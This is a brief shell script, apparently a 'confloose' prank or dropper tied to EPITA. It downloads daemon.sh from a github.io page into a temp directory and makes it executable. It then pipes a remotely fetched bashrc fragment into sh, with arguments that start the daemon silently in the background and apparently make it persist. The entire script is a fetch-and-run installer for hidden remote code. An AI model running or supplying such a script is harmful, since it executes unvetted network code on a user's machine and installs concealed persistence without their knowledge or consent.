#!/bin/sh

tempdir=$(mktemp -d)
file="$tempdir/confloose-daemon-terminal"

curl "https://d-002.github.io/epita/confloose/daemon-terminal/daemon.sh" >> "$file"
chmod +x "$file"

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "daemon-terminal" "'\"$file\" 2>/dev/null 1>&2 &'" | sh
